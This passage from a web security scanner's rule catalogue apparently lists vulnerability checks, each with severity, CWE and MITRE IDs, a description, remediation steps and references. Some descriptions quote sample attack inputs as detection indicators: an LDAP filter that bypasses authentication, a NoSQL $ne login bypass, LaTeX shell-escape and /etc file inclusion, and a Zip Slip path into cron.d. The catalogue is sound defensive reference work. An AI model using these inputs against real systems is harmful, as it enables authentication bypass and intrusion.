            "Never concatenate user-supplied values directly into LDAP filter strings or DNs",
            "Validate input against an allowlist of acceptable characters before use in LDAP queries",
            "Do not transmit LDAP search results to external endpoints",
        ],
        "references": ["https://owasp.org/www-community/attacks/LDAP_Injection", "https://cwe.mitre.org/data/definitions/90.html"],
    },
    "template_injection_client_security": {
        "severity": "HIGH",
        "short": "Client-Side Template Injection (SSTI)",
        "description": "Detects client-side template injection in Handlebars/EJS where template strings or render contexts come from URL parameters, prototype chain access expressions ({{__proto__}}) in templates enabling sandbox escape, and sensitive data (password/token) exposed in template render contexts.",
        "cwe": "CWE-94",
        "mitre": "T1059",
        "remediation": [
            "Never pass URL parameters or user-supplied strings as template source to Handlebars.compile()/ejs.render()",
            "Validate and sanitize template context variables — never pass raw user input as context",
            "Configure Handlebars with allowedProtoMethods and allowedPrototypeMethods to block prototype access",
            "Do not include sensitive fields (password, token, secret) in template render contexts",
        ],
        "references": ["https://portswigger.net/web-security/server-side-template-injection", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "prototype_pollution_advanced": {
        "severity": "HIGH",
        "short": "Advanced Prototype Pollution",
        "description": "Detects deep prototype chain pollution patterns including __proto__ or Object.setPrototypeOf() receiving URL parameter/JSON.parse values, Object.assign() merging user-controlled data (enabling __proto__ key injection), Object.defineProperty() with attacker-controlled descriptor, and bracket notation prototype writes from user input.",
        "cwe": "CWE-1321",
        "mitre": "T1059",
        "remediation": [
            "Use Object.create(null) for configuration objects to break prototype chain",
            "Validate and sanitize JSON input with allowlisted keys before Object.assign/spread",
            "Use JSON.parse with a reviver function that blocks __proto__ and constructor keys",
            "Consider using frozen objects (Object.freeze) for sensitive configuration",
        ],
        "references": ["https://portswigger.net/web-security/prototype-pollution", "https://cwe.mitre.org/data/definitions/1321.html"],
    },
    "mass_assignment_security": {
        "severity": "HIGH",
        "short": "Mass Assignment Vulnerability",
        "description": "Detects unrestricted object property assignment from user-controlled input including spread operators on URL parameters/JSON.parse, Object.assign() merging req.body/searchParams into model objects, for...in loops over user input assigning to model properties, and role/isAdmin/permission values derived from user-supplied data.",
        "cwe": "CWE-915",
        "mitre": "T1078",
        "remediation": [
            "Use explicit allowlists of permitted fields when assigning user input to models",
            "Never use Object.assign(model, req.body) — destructure only permitted fields",
            "Mark sensitive fields (role, isAdmin, permissions) as non-assignable/protected",
            "Use validation schemas (Joi, Zod) that reject unknown properties",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html", "https://cwe.mitre.org/data/definitions/915.html"],
    },
    "insecure_direct_object_reference": {
        "severity": "HIGH",
        "short": "Insecure Direct Object Reference (IDOR)",
        "description": "Detects IDOR patterns where userId/accountId/recordId values from URL parameters are used directly in API calls without visible authorization checks, sequential numeric IDs from URL parameters enable enumeration, and internal object IDs are exfiltrated to third-party analytics endpoints.",
        "cwe": "CWE-639",
        "mitre": "T1078",
        "remediation": [
            "Always verify server-side that the authenticated user owns the requested object",
            "Use opaque, non-sequential identifiers (UUIDs) rather than integer primary keys in URLs",
            "Never derive user/account/record IDs from URL parameters without ownership validation",
            "Audit all API endpoints that accept object IDs for missing authorization checks",
        ],
        "references": ["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References", "https://cwe.mitre.org/data/definitions/639.html"],
    },
    "command_injection_client_security": {
        "severity": "CRITICAL",
        "short": "Client-Side Command Injection (Node.js/Electron)",
        "description": "Detects OS command injection patterns in client-side JavaScript applications (Node.js, Electron) where exec()/spawn()/execSync() receive URL parameter values or string-concatenated user input, spawn with shell:true enables metacharacter interpretation, and command output is exfiltrated via network requests.",
        "cwe": "CWE-78",
        "mitre": "T1059",
        "remediation": [
            "Never pass user input directly to exec()/spawn()/execSync() in Electron/Node.js apps",
            "Use spawn() with argument arrays (not shell strings) and shell:false",
            "Validate and allowlist all values used in shell commands",
            "Avoid shell:true — it enables interpretation of ; | && and other metacharacters",
        ],
        "references": ["https://owasp.org/www-community/attacks/Command_Injection", "https://cwe.mitre.org/data/definitions/78.html"],
    },
    "api_rate_limit_headers": {
        "severity": "MEDIUM",
        "short": "Missing or Misconfigured API Rate Limit Headers",
        "description": "Detects API endpoints that lack RateLimit/X-RateLimit response headers, or serve these headers with dangerous values: a limit of 0 (unlimited), Retry-After of 0 (no backoff), or conflicting namespaces between proxy and origin. Without proper rate-limit headers, brute-force and enumeration attacks are unsignalled to clients and intermediaries.",
        "cwe": "CWE-770",
        "mitre": "T1498",
        "remediation": [
            "Add RateLimit-Limit, RateLimit-Remaining, and RateLimit-Reset headers to all API responses",
            "Never set RateLimit-Limit to 0; use a positive integer reflecting the actual throttle window",
            "Set Retry-After to a meaningful delay (e.g., 60 seconds) when returning 429 responses",
            "Standardise on one rate-limit header namespace (IETF draft or X-RateLimit) across proxy and origin",
        ],
        "references": ["https://tools.ietf.org/html/draft-ietf-httpapi-ratelimit-headers", "https://cwe.mitre.org/data/definitions/770.html"],
    },
    "cors_policy_advanced": {
        "severity": "HIGH",
        "short": "Dangerous CORS Policy Configuration",
        "description": "Detects high-risk CORS header combinations: wildcard origin with credentials (spec violation exploitable by misconfigured clients), ACAO: null (sandbox iframes bypass origin checks), reflected specific origin with credentials enabled (classic CORS misconfiguration allowing full credential theft), Allow-Methods including destructive verbs (PUT/DELETE), and Allow-Headers exposing authentication tokens.",
        "cwe": "CWE-346",
        "mitre": "T1539",
        "remediation": [
            "Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true",
            "Do not allow Origin: null — reject requests from sandboxed contexts",
            "Use an explicit allowlist for trusted origins rather than reflecting the request's Origin header",
            "Restrict Access-Control-Allow-Methods to the minimum required (avoid PUT, DELETE unless needed cross-origin)",
            "Do not include Authorization or API key headers in Access-Control-Allow-Headers",
        ],
        "references": ["https://portswigger.net/web-security/cors", "https://cwe.mitre.org/data/definitions/346.html"],
    },
    "content_sniffing_bypass": {
        "severity": "MEDIUM",
        "short": "Content Sniffing / MIME Type Confusion",
        "description": "Detects responses susceptible to MIME sniffing attacks: HTML/JS served without X-Content-Type-Options: nosniff (legacy browsers execute as scripts), HTML content under application/octet-stream (polyglot file execution), reflected uploaded filenames with executable extensions, and SVG files without nosniff (inline JavaScript bypasses CSP script-src).",
        "cwe": "CWE-430",
        "mitre": "T1027",
        "remediation": [
            "Add X-Content-Type-Options: nosniff to all responses, especially file downloads and uploads",
            "Never serve HTML or JavaScript content with application/octet-stream or text/plain",
            "Validate and sanitize uploaded file extensions server-side; never trust client-supplied MIME types",
            "Serve SVG files with X-Content-Type-Options: nosniff and a strict CSP",
        ],
        "references": ["https://owasp.org/www-project-secure-headers/", "https://cwe.mitre.org/data/definitions/430.html"],
    },
    "javascript_prototype_chain": {
        "severity": "HIGH",
        "short": "JavaScript Prototype Chain Manipulation",
        "description": "Detects patterns enabling prototype pollution and prototype chain exploitation: direct __proto__ assignment, Object.prototype property modification, bracket notation prototype writes from URL parameters, Object.setPrototypeOf with user-controlled inputs, hasOwnProperty overrides, and Object.defineProperty gadgets on Object.prototype that trigger code execution.",
        "cwe": "CWE-915",
        "mitre": "T1059",
        "remediation": [
            "Use Object.create(null) for dictionaries that accept user-controlled keys to avoid prototype chain",
            "Validate and reject keys named __proto__, constructor, or prototype before merging objects",
            "Use JSON schema validation to allowlist expected properties from user input",
            "Freeze Object.prototype in security-critical environments: Object.freeze(Object.prototype)",
        ],
        "references": ["https://portswigger.net/web-security/prototype-pollution", "https://cwe.mitre.org/data/definitions/915.html"],
    },
    "xml_external_entity_advanced": {
        "severity": "CRITICAL",
        "short": "XML External Entity Injection (Advanced)",
        "description": "Detects XXE indicators in HTTP responses: DOCTYPE with SYSTEM entities referencing file:// or http:// URLs (local file disclosure and SSRF), parameter entities for blind out-of-band exfiltration, XML parser error messages that fingerprint the parsing engine, SSI directives alongside XML contexts, and DOMParser.parseFromString calls with user-controlled input.",
        "cwe": "CWE-611",
        "mitre": "T1190",
        "remediation": [
            "Disable external entity processing in your XML parser (DocumentBuilderFactory.setFeature for Java, libxml2 LIBXML_NONET for PHP)",
            "Use data formats that don't support entity references (JSON) where possible",
            "Validate and reject DOCTYPE declarations in user-supplied XML",
            "Never expose XML parser error messages in production responses",
        ],
        "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing", "https://cwe.mitre.org/data/definitions/611.html"],
    },
    "broken_object_level_auth": {
        "severity": "CRITICAL",
        "short": "Broken Object Level Authorization (BOLA/IDOR)",
        "description": "Detects passive indicators of BOLA vulnerabilities: numeric object IDs in API paths without observed Authorization headers, sensitive fields (password, token, SSN) in API responses that should require per-object authorization, listing endpoints that expose total record counts suggesting missing ownership filters, and cross-user ID fields that can be substituted in request paths.",
        "cwe": "CWE-639",
        "mitre": "T1083",
        "remediation": [
            "Verify object ownership on every request — check that the authenticated user owns the requested object ID",
            "Use non-sequential, unguessable IDs (UUIDs) to prevent enumeration even if authorization is bypassed",
            "Never return sensitive fields (password hashes, tokens, SSNs) in API list or detail responses",
            "Implement authorization at the data layer, not just the route layer",
        ],
        "references": ["https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/", "https://cwe.mitre.org/data/definitions/639.html"],
    },
    "insecure_data_exposure": {
        "severity": "CRITICAL",
        "short": "Insecure Sensitive Data Exposure in Responses",
        "description": "Detects sensitive data leaked in HTTP response bodies: PEM private keys, AWS access key IDs, unmasked passwords/API keys/tokens in JSON fields, credit card numbers (PCI-DSS violation), US Social Security Numbers (GLBA/state law violation), JWT tokens returned in response bodies, and internal RFC-1918 IP addresses in JSON fields.",
        "cwe": "CWE-200",
        "mitre": "T1552",
        "remediation": [
            "Never return credentials, private keys, or payment data in API responses",
            "Mask sensitive fields in responses (replace with asterisks or omit entirely)",
            "Rotate any exposed credentials immediately and audit for access during exposure window",
            "Remove internal network information (IPs, hostnames) from API responses",
        ],
        "references": ["https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/", "https://cwe.mitre.org/data/definitions/200.html"],
    },
    "latex_injection_passive": {
        "severity": "CRITICAL",
        "short": "LaTeX Injection (Passive Detection)",
        "description": r"Detects LaTeX injection indicators: \write18 and \immediate\write18 shell escape commands (OS command execution when pdflatex is run with --shell-escape), \input{/etc/...} file inclusion patterns (local file disclosure via generated PDFs), LaTeX commands receiving URL parameters as arguments, and LaTeX engine error messages that fingerprint the rendering system.",
        "cwe": "CWE-94",
        "mitre": "T1059",
        "remediation": [
            r"Never pass user input directly into LaTeX source documents",
            r"Disable shell escape: run pdflatex without --shell-escape flag",
            r"Use sandboxed LaTeX rendering environments (Docker, seccomp) with no filesystem access",
            r"Allowlist permitted LaTeX commands and reject \input, \include, \write18 from user content",
        ],
        "references": ["https://owasp.org/www-community/attacks/Code_Injection", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "css_injection_passive": {
        "severity": "HIGH",
        "short": "CSS Injection (Style-Based Attacks)",
        "description": "Detects CSS injection indicators: IE expression() and behavior: directives that execute JavaScript in legacy/Electron environments, url('javascript:') in CSS properties, @import url() built from URL parameters (attacker-controlled external stylesheets enabling CSS exfiltration attacks), style= attributes containing URL parameter values (UI redressing, data exfiltration via background-image requests), and CSS attribute selector exfiltration gadgets that leak form field values character by character.",
        "cwe": "CWE-79",
        "mitre": "T1059",
        "remediation": [
            "Never inject URL parameters directly into style= attributes or stylesheet content",
            "Use a strict Content Security Policy that blocks inline styles and external stylesheets",
            "Sanitize user input to remove CSS-dangerous characters (<, >, (, ), :, ;)",
            "Disable expression() evaluation — use modern browsers and frameworks that ignore it",
        ],
        "references": ["https://owasp.org/www-project-web-security-testing-guide/", "https://cwe.mitre.org/data/definitions/79.html"],
    },
    "deserialization_gadget_passive": {
        "severity": "CRITICAL",
        "short": "Insecure Deserialization Gadget Indicators",
        "description": "Detects passive indicators of insecure deserialization: PHP serialized object signatures in responses (O:N:\"Class\" returned to clients enables object injection), Java serialized stream magic bytes (aced0005/rO0AB enables RCE via Apache Commons Collections gadget chains), Python pickle calls with user input (arbitrary code execution via __reduce__), PHP unserialize() from HTTP parameters (magic method chain exploitation), unsafe YAML loading, and known gadget class names in error messages.",
        "cwe": "CWE-502",
        "mitre": "T1059",
        "remediation": [
            "Never deserialize data from untrusted sources without cryptographic verification",
            "Use safe serialization formats (JSON) instead of native object serialization",
            "For Java: use allowlisting with ObjectInputFilter; remove Apache Commons Collections from classpath",
            "For PHP: avoid unserialize() on user input; use json_decode() instead",
            "For Python: use yaml.safe_load() instead of yaml.load(); avoid pickle for user data",
        ],
        "references": ["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data", "https://cwe.mitre.org/data/definitions/502.html"],
    },
    "race_condition_passive": {
        "severity": "HIGH",
        "short": "Race Condition Vulnerability Indicators",
        "description": "Detects passive indicators of race condition vulnerabilities: financial operation endpoints (transfer, withdraw, checkout) without Idempotency-Key headers, balance/stock/credit counters in responses without optimistic locking (ETag/Last-Modified), Time-of-Check-Time-of-Use (TOCTOU) patterns where balance is checked before update without atomic operation, and coupon/voucher redemption endpoints without idempotency protection enabling double-spend attacks.",
        "cwe": "CWE-362",
        "mitre": "T1499",
        "remediation": [
            "Require and validate Idempotency-Key headers on all financial and state-changing endpoints",
            "Use atomic database operations (UPDATE ... WHERE balance >= amount) instead of read-check-write",
            "Implement optimistic locking with ETag/version fields for concurrent resource updates",
            "Use distributed locks (Redis SETNX) for coupon/voucher redemption with short TTL",
        ],
        "references": ["https://portswigger.net/web-security/race-conditions", "https://cwe.mitre.org/data/definitions/362.html"],
    },
    "link_injection_passive": {
        "severity": "HIGH",
        "short": "Link Injection / Header Injection (Passive)",
        "description": "Detects link injection indicators: href attributes built from URL parameters (XSS via javascript: URLs, phishing via external URLs), document.write() with URL parameters (writes attacker HTML, bypasses innerHTML filters), response headers (Location, Refresh, Link) containing URL parameters (CRLF injection enables response splitting and arbitrary header injection), window.location set from URL parameters (open redirect), and <base href> pointing to external domains (all relative links hijacked).",
        "cwe": "CWE-116",
        "mitre": "T1190",
        "remediation": [
            "Never use URL parameters directly in href, src, or Location header values without validation",
            "Validate redirect destinations against an allowlist of permitted domains",
            "Strip CRLF characters from all header values constructed from user input",
            "Avoid document.write() entirely; use safe DOM methods (textContent, createElement)",
        ],
        "references": ["https://owasp.org/www-community/attacks/HTTP_Response_Splitting", "https://cwe.mitre.org/data/definitions/116.html"],
    },
    "parameter_pollution_passive": {
        "severity": "MEDIUM",
        "short": "HTTP Parameter Pollution (Passive)",
        "description": "Detects HTTP Parameter Pollution (HPP) indicators: code taking only [0] from multi-value parameters (front-end checks first value, back-end uses second — attacker's malicious second value bypasses WAF/validation), PHP double-bracket superglobal access, _method/X-HTTP-Method-Override parameter tunneling (WAF sees GET but back-end processes DELETE/PUT), and backend parameter splitting on delimiters enabling additional injected key-value pairs.",
        "cwe": "CWE-235",
        "mitre": "T1190",
        "remediation": [
            "Validate all occurrences of a parameter, not just the first or last",
            "Reject requests with duplicate parameter names unless explicitly supported",
            "Disable _method and X-HTTP-Method-Override support if not needed; validate against allowlist if enabled",
            "Sanitize parameter values to remove delimiter characters before splitting",
        ],
        "references": ["https://owasp.org/www-project-web-security-testing-guide/", "https://cwe.mitre.org/data/definitions/235.html"],
    },
    "timing_attack_passive": {
        "severity": "HIGH",
        "short": "Timing Side-Channel Vulnerability Indicators",
        "description": "Detects timing attack indicators: direct === or == equality comparison on tokens/passwords/secrets (JavaScript string comparison short-circuits enabling character-by-character brute force), .equals()/strcmp() on security values (not constant-time; network-measurable timing enables oracle attacks), early return on credential mismatch (faster rejection leaks prefix match), and X-Response-Time/X-Runtime headers disclosing per-request processing time for statistical oracle attacks.",
        "cwe": "CWE-208",
        "mitre": "T1110",
        "remediation": [
            "Use constant-time comparison functions: Node.js crypto.timingSafeEqual(), Python hmac.compare_digest()",
            "Never return early on partial credential matches — process the full comparison regardless of outcome",
            "Remove X-Response-Time, X-Runtime, and X-Request-Duration headers from production responses",
            "Use structured timing measurements only in non-production monitoring systems",
        ],
        "references": ["https://codahale.com/a-lesson-in-timing-attacks/", "https://cwe.mitre.org/data/definitions/208.html"],
    },
    "cryptographic_weakness_passive": {
        "severity": "HIGH",
        "short": "Weak Cryptographic Primitive Usage",
        "description": "Detects weak cryptographic implementations: MD5/SHA-1 (cryptographically broken; MD5 has known collisions; SHA-1 has SHAttered prefix collisions), DES/3DES/RC4/Blowfish ciphers (DES brute-forceable in hours; RC4 biases exploited in BEAST/POODLE; 3DES has Sweet32), AES-ECB mode (pattern-preserving; identical plaintext blocks produce identical ciphertext), Math.random() for security secrets (52-bit PRNG; predictable from output), hardcoded IVs (breaks AES-CBC/GCM confidentiality/integrity), short RSA keys (512/1024-bit; nation-state breakable), and time-based PRNG seeds.",
        "cwe": "CWE-327",
        "mitre": "T1600",
        "remediation": [
            "Use SHA-256 or SHA-3 for integrity; bcrypt/argon2/scrypt for password hashing",
            "Use AES-256-GCM for encryption with a random 96-bit IV per message",
            "Replace Math.random() with crypto.getRandomValues() (browser) or crypto.randomBytes() (Node.js)",
            "Use RSA-2048 minimum or ECC P-256 for asymmetric cryptography",
            "Never hardcode IVs; generate a fresh random IV for each encryption operation",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html", "https://cwe.mitre.org/data/definitions/327.html"],
    },
    "nosql_injection_advanced": {
        "severity": "CRITICAL",
        "short": "NoSQL Injection (Advanced MongoDB/Redis Detection)",
        "description": "Detects NoSQL injection patterns: MongoDB $where operator receiving URL parameters (server-side JavaScript execution; authorization bypass), query operators ($gt/$ne/$regex) sourced from req.body (attacker sends {password:{$ne:null}} to bypass authentication), .find() receiving raw req.body as query selector (no sanitization; operator injection), .aggregate() with user-controlled pipeline stages (joins sensitive collections, enumerates records), mapReduce() with user input (MongoDB JavaScript execution), and database error disclosure (MongoError/CastError reveals schema and field names).",
        "cwe": "CWE-943",
        "mitre": "T1190",
        "remediation": [
            "Never pass req.body or URL parameters directly to MongoDB query selectors",
            "Disable $where and JavaScript execution in MongoDB: security.javascriptEnabled: false",
            "Use mongoose Schema validation with strict mode to reject unknown operators",
            "Allowlist permitted query operators; reject $where, $function, $accumulator",
            "Suppress database error details from API responses",
        ],
        "references": ["https://owasp.org/www-project-web-security-testing-guide/", "https://cwe.mitre.org/data/definitions/943.html"],
    },
    "ldap_injection_passive": {
        "severity": "HIGH",
        "short": "LDAP Injection (Passive Detection)",
        "description": "Detects LDAP injection indicators: search filters constructed from URL parameters (attacker injects * | & ! to modify filter logic; (&(uid=admin)(pass=*))(|(uid=*)) bypasses authentication), LDAP filters built by string concatenation with user input (no parameterized API used), .bind() with user-controlled credentials (anonymous or impersonated bind via empty string or foreign DN injection), LDAP error messages revealing directory structure, and Distinguished Names in response bodies exposing internal directory topology.",
        "cwe": "CWE-90",
        "mitre": "T1190",
        "remediation": [
            "Use parameterized LDAP search APIs; never build filter strings by string concatenation",
            "Escape LDAP special characters (* ( ) \\ NUL) from user input using RFC 4515/4514 escaping",
            "Use least-privilege LDAP service accounts that cannot read sensitive attributes",
            "Suppress LDAP error details from application responses",
        ],
        "references": ["https://owasp.org/www-community/attacks/LDAP_Injection", "https://cwe.mitre.org/data/definitions/90.html"],
    },
    "oauth_misconfiguration_passive": {
        "severity": "HIGH",
        "short": "OAuth 2.0 Implementation Misconfiguration",
        "description": "Detects OAuth 2.0 implementation flaws: access tokens in URL query strings (logged by web servers, proxies, browser history, and Referer headers), client_secret returned in API responses (allows impersonation of the application), implicit flow (response_type=token/id_token — deprecated in OAuth 2.1; tokens exposed in URL fragments), and overly broad scopes (wildcard * grants full access on token compromise).",
        "cwe": "CWE-346",
        "mitre": "T1539",
        "remediation": [
            "Always transmit access tokens in Authorization header, never in URLs",
            "Never return client_secret to clients; store securely server-side only",
            "Migrate from implicit flow to authorization code flow with PKCE",
            "Request minimal scopes; never use wildcard scope",
            "Validate redirect_uri against a strict allowlist",
        ],
        "references": ["https://oauth.net/2/security-best-current-practice/", "https://cwe.mitre.org/data/definitions/346.html"],
    },
    "saml_security_passive": {
        "severity": "HIGH",
        "short": "SAML Implementation Security Weaknesses",
        "description": "Detects SAML implementation weaknesses: multiple Assertion elements with different IDs (XML Signature Wrapping attack — attacker wraps a malicious unsigned assertion around a signed one; signature validates while SP processes attacker's content), RSA-SHA1 signature algorithm (SHA-1 deprecated; SHAttered collision enables signature forgery), SAML library error messages in responses (reveals library version and enables targeted CVE attacks), and unspecified NameID format (allows arbitrary NameID values enabling account impersonation).",
        "cwe": "CWE-347",
        "mitre": "T1550",
        "remediation": [
            "Use a hardened SAML library with XSW protection (python3-saml, ruby-saml with patches, Spring Security SAML)",
            "Validate that the signed element is the element actually processed — check IDs and positions",
            "Require RSA-SHA256 or RSA-SHA512; reject SHA-1 signed assertions",
            "Use a specific NameID format (emailAddress or persistent) rather than unspecified",
        ],
        "references": ["https://portswigger.net/web-security/saml", "https://cwe.mitre.org/data/definitions/347.html"],
    },
    "actuator_endpoint_exposure": {
        "severity": "CRITICAL",
        "short": "Spring Boot Actuator Endpoint Exposed",
        "description": "Detects exposed Spring Boot Actuator management endpoints: full _links map (reveals all management endpoints with no auth), /env returning systemProperties/systemEnvironment (database passwords, API keys, cloud credentials in plaintext), /heapdump accessible (full JVM heap snapshot — every in-memory secret, session token, and decrypted credential is extractable), Prometheus metrics endpoint (request rates, error rates, connection pool state, latency percentiles without authentication), Jolokia JMX-over-HTTP (read/write MBean attributes, invoke operations including classloading and JVM shutdown), and detailed /health including db/redis/diskSpace status (infrastructure topology for reconnaissance).",
        "cwe": "CWE-200",
        "mitre": "T1590",
        "remediation": [
            "Restrict actuator exposure: management.endpoints.web.exposure.include=health,info",
            "Require authentication for all actuator endpoints: management.endpoint.env.enabled=false or Spring Security rules",
            "Never expose /heapdump or /threaddump in production",
            "Place actuator endpoints on a separate port bound to 127.0.0.1 only",
            "Disable Jolokia unless explicitly required; never expose it unauthenticated",
        ],
        "references": ["https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html", "https://owasp.org/www-project-web-security-testing-guide/"],
    },
    "integer_overflow_passive": {
        "severity": "HIGH",
        "short": "Integer Overflow / Underflow in Financial Calculations",
        "description": "Detects integer arithmetic vulnerabilities in financial or quantity calculations: price × parseInt(req.body) without bounds check (attacker sends negative quantity; total price becomes negative; credit issued to attacker), balance -= parseInt(req.body.amount) without validation (negative withdrawal adds to balance), parseInt(searchParams) without min/max range validation (overflow/underflow in downstream calculations), price×quantity without Math.abs (signed arithmetic; negative values produce credit instead of debit), and large integer constants near Number.MAX_SAFE_INTEGER (precision loss above 2^53; integer identity checks fail).",
        "cwe": "CWE-190",
        "mitre": "T1190",
        "remediation": [
            "Validate all numeric inputs with explicit minimum/maximum bounds before arithmetic",
            "Use Math.abs() or reject negative values for quantity/amount fields",
            "Use BigInt or a decimal arithmetic library for financial calculations to avoid precision loss",
            "Apply server-side range validation independent of client-side constraints",
            "Reject out-of-range values with 400 Bad Request before any calculation",
        ],
        "references": ["https://cwe.mitre.org/data/definitions/190.html", "https://owasp.org/www-project-top-ten/"],
    },
    "tabnapping_passive": {
        "severity": "MEDIUM",
        "short": "Tabnapping / window.opener Exploitation",
        "description": "Detects tabnapping vulnerabilities: <a target=_blank> without rel='noopener noreferrer' (opened tab retains window.opener reference; malicious site can redirect the opener/parent tab to a phishing page while user is looking at the new tab), window.opener.location redirect (child explicitly redirects opener to attacker URL), window.opener.postMessage() without origin validation (attacker sends crafted cross-origin messages to opener bypassing same-origin), window.open() without nulling opener reference, and missing Referrer-Policy header (Referer leaks full URL including auth tokens to opened external resources).",
        "cwe": "CWE-1022",
        "mitre": "T1192",
        "remediation": [
            "Add rel='noopener noreferrer' to all <a target=_blank> links",
            "Set window.opener = null immediately after window.open() calls",
            "Validate origin in all window.postMessage() handlers",
            "Set Referrer-Policy: strict-origin-when-cross-origin or no-referrer",
            "Use <meta name=referrer content=no-referrer> for legacy browser coverage",
        ],
        "references": ["https://owasp.org/www-community/attacks/Reverse_Tabnapping", "https://cwe.mitre.org/data/definitions/1022.html"],
    },
    "zip_slip_passive": {
        "severity": "HIGH",
        "short": "Zip Slip Path Traversal in Archive Extraction",
        "description": "Detects Zip Slip path traversal vulnerabilities in archive extraction code: Python zipfile.extractall() without path normalization (writes files to arbitrary filesystem paths; attacker-crafted ../../../../etc/cron.d/backdoor in zip), archive iteration without realpath/normpath validation (member.name used directly in file writes), ../ traversal sequences in archive member filenames detected in responses, Java ZipInputStream without canonicalPath check (extraction to server root possible), upload-then-extract patterns without member path sanitization, and os.path.join with untrusted archive member names (on Unix, a name starting with / causes os.path.join to ignore all prior components).",
        "cwe": "CWE-22",
        "mitre": "T1190",
        "remediation": [
            "Validate each archive member's path: os.path.realpath(os.path.join(dest, member.name)).startswith(dest)",
            "For Java: use File.getCanonicalPath() and verify it starts with the extraction destination",
            "Reject any member whose resolved path escapes the destination directory",
            "Use a hardened extraction library that handles path validation automatically",
            "Limit extraction to a temporary directory with quota enforcement",
        ],
        "references": ["https://snyk.io/research/zip-slip-vulnerability", "https://cwe.mitre.org/data/definitions/22.html"],
    },
    "graphql_introspection_security": {
        "severity": "HIGH",
        "short": "GraphQL Introspection and Information Disclosure",
        "description": "Detects dangerous GraphQL exposure patterns: full schema introspection enabled (__schema.types visible), mutation types discoverable, stack traces in error extensions, verbose error messages disclosing field names, interactive IDE (GraphiQL/Playground) accessible in production, and field name suggestions that allow enumeration even with introspection disabled.",
        "cwe": "CWE-200",
        "mitre": "T1590",
        "remediation": [
            "Disable GraphQL introspection in production environments",
            "Remove or sanitize error messages — return generic 'Internal Error' instead of schema details",
            "Disable stack traces in production error extensions",
            "Disable GraphQL IDE (GraphiQL, Apollo Studio, Playground) in production",
            "Disable field suggestions or implement query allowlisting",
        ],
        "references": ["https://owasp.org/API-Security/", "https://graphql.org/learn/security/"],
    },
    "dependency_hijacking": {
        "severity": "HIGH",
        "short": "Dependency Hijacking / Supply Chain Attack",
        "description": "Detects client-side code that loads packages or modules from CDN URLs constructed from user-controlled URL parameters, dynamic require()/import() calls with attacker-controlled paths, and external script tags without Subresource Integrity (SRI) attributes. An attacker who controls the loaded package can execute arbitrary code with full page context.",
        "cwe": "CWE-829",
        "mitre": "T1195",
        "remediation": [
            "Never construct CDN URLs from URL parameters; hardcode exact package versions",
            "Add integrity= and crossorigin= attributes to all external <script> and <link> tags",
            "Use a Content Security Policy with require-sri-for script style directives",
            "Avoid dynamic require()/import() with any user-supplied path component",
        ],
        "references": ["https://owasp.org/www-project-top-ten/", "https://cwe.mitre.org/data/definitions/829.html"],
    },
    "file_inclusion_security": {
        "severity": "HIGH",
        "short": "File Inclusion / Path Traversal (Client-Side)",
        "description": "Detects JavaScript patterns where file read operations (fs.readFile, require()) accept paths built from URL parameters or user input, enabling path traversal via ../ sequences. Attackers can read arbitrary files outside the web root, including configuration files with secrets.",
        "cwe": "CWE-22",
        "mitre": "T1083",
        "remediation": [
            "Never pass URL parameters directly to file system APIs",
            "Resolve paths with path.resolve() and verify they fall within an allowed base directory",
            "Maintain an allowlist of permitted filenames rather than accepting arbitrary paths",
            "Use a chroot or sandbox to limit file system access",
        ],
        "references": ["https://owasp.org/www-community/attacks/Path_Traversal", "https://cwe.mitre.org/data/definitions/22.html"],
    },
    "server_side_template_passive": {
        "severity": "HIGH",
        "short": "Server-Side Template Injection (Passive Detection)",
        "description": "Passively detects indicators of Server-Side Template Injection (SSTI) in HTTP responses: reflected template expressions with math operations (7*7) or config/self references, template engine error messages (TemplateSyntaxError, Twig_Error) that reveal engine type and version, and server headers that fingerprint the template engine (Werkzeug, Flask, Django) enabling targeted payload selection.",
        "cwe": "CWE-94",
        "mitre": "T1190",
        "remediation": [
            "Never render user input as template source — always treat it as data",
            "Use auto-escaping template engines and keep it enabled",
            "Suppress template engine error details in production responses",
            "Remove or generalize Server/X-Powered-By headers to avoid engine fingerprinting",
        ],
        "references": ["https://portswigger.net/research/server-side-template-injection", "https://cwe.mitre.org/data/definitions/94.html"],
    },
    "http_request_smuggling": {
        "severity": "HIGH",
        "short": "HTTP Request Smuggling (Passive Detection)",
        "description": "Passively detects response patterns indicating HTTP request smuggling vulnerabilities: simultaneous Transfer-Encoding and Content-Length headers (TE/CL or CL/TE desync), obfuscated Transfer-Encoding values that bypass front-end parsing, proxy headers combined with chunked encoding, and duplicate Content-Length headers. These mismatches between front-end proxies and back-end servers allow attackers to poison the request pipeline.",
        "cwe": "CWE-444",
        "mitre": "T1190",
        "remediation": [
            "Ensure front-end and back-end servers interpret HTTP headers identically",
            "Reject ambiguous requests with both Transfer-Encoding and Content-Length",
            "Use HTTP/2 end-to-end where possible to eliminate HTTP/1.1 parsing ambiguity",
            "Keep proxy and web server software updated to current patched versions",
        ],
        "references": ["https://portswigger.net/web-security/request-smuggling", "https://cwe.mitre.org/data/definitions/444.html"],
    },
    "protocol_confusion": {
        "severity": "HIGH",
        "short": "HTTP/HTTPS Protocol Confusion",
        "cwe": "CWE-319", "owasp": "A02:2021",
        "threats": [
            "Site accessible on HTTP (200): MITM attacker intercepts all traffic, steals session cookies",
            "HTTP redirect to HTTP (not HTTPS): cleartext traffic never upgraded, MITM trivially intercepts credentials",
            "HTTP to HTTPS without HSTS: SSL stripping attack downgrades first-visit HTTPS handshake",
            "CSP without upgrade-insecure-requests: sub-resources requested over HTTP as mixed content",
            "Cookie set on HTTP site can override HTTPS subdomain cookies (cookie tossing via parent domain)",
        ],
        "remediation": [
            "Redirect ALL HTTP traffic to HTTPS with a 301 redirect at the web server level",
            "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload to HTTPS responses",
